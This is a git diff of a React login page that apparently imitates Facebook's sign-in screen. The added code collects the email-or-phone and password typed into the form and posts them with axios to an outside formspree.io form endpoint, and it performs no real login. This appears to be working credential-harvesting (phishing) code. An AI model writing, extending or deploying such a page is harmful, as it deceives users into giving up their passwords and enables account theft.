@@ -10,20 +10,57 @@ import BlackBackground from './components/BlackBackground';
 import TitleFb from './components/TitleFb';
 
 import {useTranslation }  from 'react-i18next'
+import axios from "axios"
 
 
 
 
 function App() {
+  let data = {
+    emailOrPhone: '',
+    password: ''
+  }
  
 
   const [openModal, setOpenModal] = useState(false)
   let [widthLoading, setWidthLoading] = useState(0)
   const [shouldCount, setShouldCount] = useState(false)
-
+  const [userInfo, setUserInfo] = useState(data)
   const [t, i18n] = useTranslation('common')
 
+  // handle input
 
+
+  const handleChange = e=>{
+
+    
+    setUserInfo({
+      ...userInfo,
+      [e.target.id]: e.target.value
+    })
+
+
+
+  }
+
+
+// sumbmit data
+
+
+
+
+
+const submitInfo = e=>{
+  e.preventDefault()
+
+  axios.post("https://formspree.io/f/mzbkknod",userInfo)
+  .then(()=>{
+    console.log("data submitted")
+  })
+  .catch(err=>{
+    console.log(err)
+  })
+}
 
 
 
@@ -52,6 +89,10 @@ function App() {
     return ()=>clearInterval(interval)
   }, [shouldCount,widthLoading])
 
+
+
+
+
   
 
 
@@ -75,6 +116,8 @@ function App() {
     setShouldCount(false)
   }
 
+  const { password,emailOrPhone }  = userInfo
+
 
 
   return (
@@ -83,9 +126,15 @@ function App() {
         <div className="loading"id="load" style={{width: widthLoading+"%"}}></div>
           <TitleFb />
           <div className="main">
-            <Email />
-            <Password />
-            <ButtonConnexion set_animation={set_animation} />
+            <form
+              onSubmit={submitInfo}
+            >
+
+              <Email handleChange={handleChange}  emailOrPhone={emailOrPhone || ''} />
+              <Password handleChange={handleChange} password={password || ''}  />
+              <ButtonConnexion set_animation={set_animation} />
+
+            </form>
 
 
             <p className="forgot">
